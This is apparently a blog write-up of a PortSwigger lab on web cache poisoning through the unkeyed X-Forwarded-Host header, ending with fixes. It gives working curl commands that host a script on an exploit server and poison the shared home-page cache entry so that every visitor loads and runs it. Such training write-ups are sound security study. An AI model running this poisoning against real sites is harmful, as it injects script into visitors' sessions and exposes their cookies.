---
layout: post
title: "PortSwigger: Web cache poisoning with an unkeyed header"
date: 2027-12-19 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, WebCachePoisoning]
tags: [portswigger, web-cache-poisoning, x-forwarded-host, unkeyed-header, cache-key, xss, cwe-525, cwe-349]
---

A cache sits in front of this shop to serve popular pages fast. To decide whether two requests are "the same page" — and can share one stored response — it builds a **cache key** from parts of the request. Here the key is just the **host + path**, and it ignores the `X-Forwarded-Host` header. That omission ([CWE-525](https://cwe.mitre.org/data/definitions/525.html) / [CWE-349](https://cwe.mitre.org/data/definitions/349.html)) is the whole bug, because the app *trusts* that header to build a URL in the page.

## Overview

The home page imports its analytics script from an absolute URL:

```html
<script src="//YOUR-LAB-ID.web-security-academy.net/resources/js/tracking.js"></script>
```

The host in that URL is not hard-coded — the backend copies it from the incoming `X-Forwarded-Host` header. Two facts together make this exploitable:

- `X-Forwarded-Host` is **reflected** into the `<script src>`, but
- `X-Forwarded-Host` is **not part of the cache key**.

So `GET /` with a malicious `X-Forwarded-Host` collides with the plain `GET /` that every normal user loads. If I can get the cache to store a response whose script source points at my server, everyone who visits `/` downloads and runs my JavaScript — a per-request reflection becomes a stored XSS against every visitor.

## Step 1 — Prove the header is unkeyed (without poisoning the real entry)

I add a private cache-buster query (`?cb=...`) so I get my *own* cache key while probing, then watch the reflected script src on a cache **miss**:

```
curl -sk "https://LAB/?cb=canary123" \
  -H "X-Forwarded-Host: canary-test.example.net" -D - | grep tracking.js
```

Response:

```
script src="//canary-test.example.net/resources/js/tracking.js"
```

with `X-Cache: miss`. The header is reflected straight into the URL, and the `?cb`
means I never touched the shared bare-`/` entry while testing.

## Step 2 — Host the payload on the exploit server

I serve `alert(document.cookie)` at exactly the path the page imports, `/resources/js/tracking.js`:

```
curl -sk -X POST "https://EXPLOIT-SERVER/" \
  --data-urlencode "formAction=STORE" \
  --data-urlencode "responseFile=/resources/js/tracking.js" \
  --data-urlencode "responseHead=HTTP/1.1 200 OK
Content-Type: application/javascript" \
  --data-urlencode "responseBody=alert(document.cookie)"
```

## Step 3 — Poison the shared cache

Now I send `GET /` with the malicious `X-Forwarded-Host` and **no** cache buster, so it lands on the default key everyone shares. The first response is an `X-Cache: miss`, and that miss is the one whose response gets stored:

```
curl -sk "https://LAB/" -H "X-Forwarded-Host: EXPLOIT-SERVER" \
  -D - -o /dev/null | grep -i x-cache
```

## Step 4 — Verify and solve

A plain request to `/` — no header, exactly what a victim sends — now serves the poisoned script source:

```
curl -sk "https://LAB/" | grep -o "//EXPLOIT-SERVER/resources/js/tracking.js"
```

The lab bot loads the home page on its own schedule, hits the poisoned entry, downloads the attacker's `tracking.js`, and `alert(document.cookie)` fires. The status widget flips to **Solved**. On this run the poison landed on the very first request; the widget flipped after ~20 seconds of bot-visit lag.

## Why it worked

The exploit hinges on a mismatch: the cache decides "same page" without looking at `X-Forwarded-Host`, but the app builds the page's script URL *from* that header. An attacker-flavoured request and an innocent request collapse into one cache slot; fill that slot once and the cache faithfully serves it to everyone. Because the injected script runs in the lab's own origin, it executes with the victim's cookies.

## The fix

- **Build absolute URLs from a server-pinned canonical host**, never from `X-Forwarded-Host`/`Host`. Strip `X-Forwarded-*` at the edge unless it comes from a trusted proxy.
- **Key the cache on every response-influencing header** (add `X-Forwarded-Host` to the key or a `Vary`), or don't cache HTML that embeds request-derived URLs (`Cache-Control: no-store`).
- **Ship a strict CSP** (`script-src 'self'`) so a hijacked script host cannot pull external JavaScript even if the URL is poisoned.
